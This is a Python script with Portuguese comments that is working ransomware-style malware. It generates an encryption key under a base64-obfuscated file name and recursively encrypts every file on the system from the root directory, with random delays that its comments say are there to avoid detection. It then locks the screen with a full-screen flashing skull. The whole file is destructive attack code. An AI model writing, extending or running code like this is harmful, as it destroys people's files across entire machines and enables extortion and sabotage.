import importlib
import os
import random
import time
import tkinter as tk
from base64 import b64decode, b64encode
from datetime import datetime

# Nome obfuscado do arquivo de chave (decodificado para "filekey.key")
key_file_name = b64decode(b'ZmlsZWtleS5rZXk=').decode()

# Função para carregar módulos dinamicamente
def get_module(name):
    try:
        return importlib.import_module(name)
    except ImportError:
        return None

# Carregar módulo de criptografia dinamicamente
crypto_module = get_module("cryptography.fernet")
if not crypto_module:
    exit(1)

# Caminho do próprio script em execução para ignorar durante a criptografia
current_script = os.path.abspath(__file__)

# Ignora o próprio arquivo ao criptografar
def ignore_self(filename):
    return os.path.abspath(filename) == current_script

# Geração da chave de criptografia
def gk():
    try:
        if not os.path.exists(key_file_name):
            key = crypto_module.Fernet.generate_key()
            with open(key_file_name, "wb") as f:
                f.write(b64encode(key))
    except:
        pass

# Carregar a chave de criptografia
def lk():
    try:
        with open(key_file_name, "rb") as f:
            return b64decode(f.read())
    except:
        return None

# Criptografar um único arquivo, ignorando o próprio script
def ef(fn):
    if ignore_self(fn) or not os.path.exists(fn) or not os.path.isfile(fn):
        return
    key = lk()
    if key is None:
        return
    try:
        fernet = crypto_module.Fernet(key)
        with open(fn, "rb") as f:
            original = f.read()
        encrypted = fernet.encrypt(original)
        with open(fn, "wb") as ef:
            ef.write(encrypted)
    except:
        pass

# Recursivamente criptografar todos os arquivos no sistema, ignorando o próprio arquivo
def encrypt_all_files():
    start_dir = "/" if os.name != "nt" else "C:\\"
    try:
        for root, _, files in os.walk(start_dir):
            for file in files:
                file_path = os.path.join(root, file)
                ef(file_path)
                time.sleep(random.uniform(0.05, 0.2))  # Delay aleatório para reduzir detecção
    except:
        pass

# ASCII Skull Art
skull_ascii = """
            uuuuuuu
        uu$$$$$$$$$$$uu
     uu$$$$$$$$$$$$$$$$$uu
    u$$$$$$$$$$$$$$$$$$$$$u
   u$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$$$$$$$$$$$$$$$$$$$$u
  u$$$$$$"   "$$$"   "$$$$$$u
  "$$$$"      u$u       $$$$"
   $$$u       u$u       u$$$
   $$$u      u$$$u      u$$$
    "$$$$uu$$$   $$$uu$$$$"
     "$$$$$$$"   "$$$$$$$"
       u$$$$$$$u$$$$$$$u
        u$"$"$"$"$"$"$u
             uuuuu
"""

# Tela de bloqueio com arte ASCII
def create_blocking_screen():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.configure(bg='black')
    root.overrideredirect(True)

    label = tk.Label(root, text=skull_ascii, font=("Courier", 14), fg="green", bg="black")
    label.pack(expand=True)

    def flash():
        # Alterna entre duas configurações de cores
        if label.cget("fg") == "green":  # Se a caveira está verde
            label.config(fg="black")     # Muda a cor da caveira para preto
            root.config(bg="green")      # Muda o fundo para verde
        else:
            label.config(fg="green")     # Muda a cor da caveira para verde
            root.config(bg="black")      # Muda o fundo para preto
        root.after(300, flash)           # Repete o flash a cada 300 ms

    flash()  # Inicia o efeito de piscar
    root.mainloop()

# Função principal para gerar chave, criptografar arquivos e exibir tela de bloqueio
if __name__ == "__main__":
    gk()  # Gera a chave de criptografia
    encrypt_all_files()  # Criptografa todos os arquivos, exceto o próprio script
    create_blocking_screen()  # Exibe a tela de bloqueio
